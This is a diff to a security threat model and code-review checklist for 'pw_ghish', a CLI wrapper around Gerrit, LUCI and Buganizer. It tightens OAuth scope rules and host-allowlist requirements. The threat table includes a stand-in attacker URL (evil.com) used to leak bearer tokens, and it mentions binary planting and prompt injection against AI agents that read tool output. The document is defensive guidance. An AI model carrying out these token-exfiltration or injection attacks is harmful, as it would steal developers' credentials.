@@ -46,7 +46,7 @@ following threats:
 | **T1: Sandbox Credential Escape** | Sandboxed AI coding agents, Bazel test actions, or third-party build scripts running on the same machine. | Typically blocked from reading `~/.ssh` and `~/.config/chrome_infra/auth`, **but allowed to read/write `/tmp`, the Git workspace, and often `~/.cache`**. | If `pw_ghish` writes bearer tokens, refresh tokens, or SSO headers into `/tmp`, `out/`, or `~/.cache/ghish/`, a sandboxed process can steal live `@google.com` credentials. |
 | **T2: Local Process & Binary Planting** | Unprivileged local software running under the developer's UID (`npm` postinstall scripts, `pip` setup.py, untrusted repo hooks) or shared-host users. | Files in world-writable directories (`/tmp`), unverified downloaded binaries, or group/world-writable cache directories. | Trojanizing a helper binary (`luci-auth`, `gh-ish`) or reading leftover tempfiles after a `SIGKILL`. |
 | **T3: Cross-Origin & Redirect Token Leakage** | Malicious URL passed on the CLI (`./gh pr view https://evil.com/...`), malicious `.ghish.toml` in an untrusted repo, or an HTTP `302` redirect to an external domain. | Any HTTP request made by `pw_ghish` transports. | Exfiltrating a user's `Authorization: Bearer` token or `sso_client` ticket to an attacker-controlled server. |
-| **T4: Over-Scoped "God Tokens"** | Any compromised backend endpoint, proxy, or leaked request header. | The OAuth2 `access_token` sent on that request. | If a token carries `cloud-platform` or a union of all scopes (`gerritcodereview` + `buganizer` + `androidbuild.internal`), leaking one token compromises GCP projects, source code, and internal bugs simultaneously. |
+| **T4: Over-Scoped "God Tokens"** | Any compromised backend endpoint, proxy, or leaked request header. | The OAuth2 `access_token` sent on that request. | If a token carries superuser scopes like `cloud-platform`, or if `community` mode requests internal scopes (`buganizer`, `androidbuild.internal`) beyond `gerritcodereview` + `userinfo.email`, leaking one token compromises GCP projects or widens exposure unnecessarily. |
 | **T5: 1P Corp Policy & RAPT Bypass** | Custom OAuth flows or custom refresh-token stores that bypass `gcert` or `luci-auth`. | Long-lived refresh tokens stored on disk without Google ReAuth / RAPT (20-hour hardware security key proof). | Weakens Google Corp's 20-hour hardware-key session boundary and leaves orphaned tokens behind after `luci-auth logout`. |
 | **T6: Log, Error & Transcript Leakage** | Terminal scrollback, CI build logs, crash dumps, and AI agent conversation transcripts. | Everything printed to `stdout` or `stderr` (including under `-v` / `--verbose`). | Recording live bearer tokens, cookies, or internal URLs into persistent logs or LLM context windows. |
 | **T7: Untrusted Remote Content Injection** | External users posting Gerrit review comments, CL descriptions, Buganizer issue bodies, or CI failure logs. | Text rendered by `./gh pr view`, `./gh issue view`, `./gh run view`, or `./gh sense`. | Terminal ANSI escape sequence injection (terminal takeover) or LLM prompt injection against AI agents reading `./gh` output. |
@@ -69,12 +69,14 @@ invariant ID (`SEC-INV-*`) in review comments when flagging a violation.
   Persistent OAuth tokens must live exclusively in `luci-auth`'s canonical store
   (`~/.config/chrome_infra/auth/tokens.json` or OS keychain) so that
   `./gh auth logout` and `luci-auth logout` revoke all cached credentials atomically.
-* **`SEC-INV-3` (Per-Service Least-Privilege OAuth Scopes — Never `cloud-platform`)**:
-  `pw_ghish` must request and attach only the minimal OAuth scope required by
-  each target service (`userinfo.email` for LUCI Buildbucket/LogDog, `buganizer`
-  for Issue Tracker, `gerritcodereview` for Gerrit, `androidbuild.internal` for
-  Busytown) and must never request the superuser
-  `https://www.googleapis.com/auth/cloud-platform` scope for normal operations.
+* **`SEC-INV-3` (Mode-Scoped `luci-auth` OAuth Scopes — Never `cloud-platform`)**:
+  `pw_ghish` must bound `luci-auth` OAuth2 scopes strictly per authentication
+  mode (`luciAuthScopes`: `community` requests only `gerritcodereview` and
+  `userinfo.email`, refusing `buganizer` and `androidbuild.internal` via
+  `luciAuthTokenWithScope`; `googler` requests `gerritcodereview`,
+  `userinfo.email`, `buganizer`, and `androidbuild.internal` so one `luci-auth`
+  login covers 1P services) and must never request the superuser
+  `https://www.googleapis.com/auth/cloud-platform` scope.
 * **`SEC-INV-4` (Preserve 1P Hardware-Backed Auth & RAPT)**:
   `pw_ghish` must delegate OAuth2 token minting, login, and refresh to the
   official `luci-auth` binary (configuring `/usr/bin/sso-cred-helper` when
@@ -83,9 +85,9 @@ invariant ID (`SEC-INV-*`) in review comments when flagging a violation.
   Google Corp's 20-hour ReAuth/RAPT hardware-key policy without a custom
   refresh-token store.
 * **`SEC-INV-5` (Strict HTTPS & Host Allowlisting Before Attaching Credentials)**:
-  Every authenticated HTTP client, `RoundTripper`, and CLI wrapper
-  (`GerritClient.trusted` / `isGerritAutoAuthHost`, `LUCIAuthTransport`,
-  `AndroidBuildAuthTransport`, `ssoClientRoundTripper`) must verify
+  Every authenticated HTTP client, per-request auth helper, `RoundTripper`, and
+  CLI wrapper (`GerritClient.trusted` / `isGerritAutoAuthHost`, `bearerAuth` in
+  `LUCIClient` and `BusytownProvider`, `ssoClientRoundTripper`) must verify
   `req.URL.Scheme == "https"` (or loopback HTTP in hermetic tests) and validate
   `req.URL.Host` against the explicit host or domain allowlist for that
   credential type before attaching credentials, and must strip `Authorization`
@@ -173,13 +175,13 @@ type CachedOAuthState struct {
 
 ---
 
-### 3.3. Requesting `cloud-platform` or Multi-Service Scope Unions (`SEC-INV-3`)
+### 3.3. Requesting `cloud-platform` or Unbounded Scope Sets (`SEC-INV-3`)
 
-**Why it happens:** Copy-pasting `gcloud` default scopes or combining all scopes
-into a single `luci-auth token -scopes "..."` call for convenience.
+**Why it happens:** Copy-pasting broad GCP default scopes or adding `cloud-platform`
+to `luciAuthScopes` for convenience.
 **Why it is a blocking vulnerability:** `cloud-platform` grants full read/write
-access to all GCP resources, which `pw_ghish` never needs for Gerrit, LUCI, or
-Buganizer.
+access to all GCP resources, which `pw_ghish` never needs for Gerrit, LUCI,
+Android Build, or Buganizer.
 
 **Bad:**
 ```go
@@ -227,7 +229,7 @@ func (t *MyAuthTransport) RoundTrip(req *http.Request) (*http.Response, error) {
 ### 3.5. Swallowing Subprocess `stderr` in Auth / Tool Probes (`SEC-INV-7`)
 
 **Why it happens:** Calling `exec.CommandContext(ctx, bin, args...).Output()`
-and ignoring both `err` and `stderr` when probing `luci-auth` or `gcloud`.
+and ignoring both `err` and `stderr` when probing `luci-auth`.
 **Why it is a should-fix / blocking bug:** Masks OS permission errors (`EPERM` /
 macOS TCC blocks on `~/Downloads`), expired RAPT sessions, and missing OAuth
 scopes under a misleading generic error.
@@ -269,10 +271,11 @@ When reviewing any change to `pw_ghish`, verify every item in this checklist:
       ownership by `os.Getuid()`?
 
 ### B. OAuth Scopes & 1P Corp Authentication
-- [ ] **Least-privilege scopes (`SEC-INV-3`)**: Does each backend request only
-      its own minimal scope (`userinfo.email`, `buganizer`, `gerritcodereview`,
-      or `androidbuild.internal`), and is `cloud-platform` absent from normal
-      operational token requests?
+- [ ] **Mode-bounded scopes (`SEC-INV-3`)**: Does `luciAuthScopes` keep
+      `community` mode limited to `gerritcodereview` and `userinfo.email` and
+      `googler` mode limited to `gerritcodereview`, `userinfo.email`,
+      `buganizer`, and `androidbuild.internal`, with `cloud-platform` strictly
+      absent?
 - [ ] **Corp SSO & `luci-auth` delegation (`SEC-INV-4`)**: Does OAuth2 token
       minting, login, and refresh delegate to `luci-auth` (with
       `/usr/bin/sso-cred-helper` when present on Corp Linux) and `sso_client`
@@ -281,11 +284,10 @@ When reviewing any change to `pw_ghish`, verify every item in this checklist:
 
 ### C. HTTP Transports, URLs, & Redirects
 - [ ] **HTTPS + Host allowlist (`SEC-INV-5`)**: Before attaching `Authorization`
-      headers or invoking `sso_client`, does the client or transport
-      (`GerritClient.trusted` / `isGerritAutoAuthHost`, `LUCIAuthTransport`,
-      `AndroidBuildAuthTransport`, `ssoClientRoundTripper`) verify
-      `req.URL.Scheme == "https"` and match `req.URL.Host` against the explicit
-      allowlist for that service?
+      headers or invoking `sso_client`, does the client, per-request helper, or
+      transport (`GerritClient.trusted` / `isGerritAutoAuthHost`, `bearerAuth`,
+      `ssoClientRoundTripper`) verify `req.URL.Scheme == "https"` and match
+      `req.URL.Host` against the explicit allowlist for that service?
 - [ ] **Cross-host redirect stripping (`SEC-INV-5`)**: Does `http.Client` strip
       `Authorization` headers via `stripAuthOnCrossHostRedirect` if an HTTP
       redirect crosses host boundaries or downgrades from HTTPS?
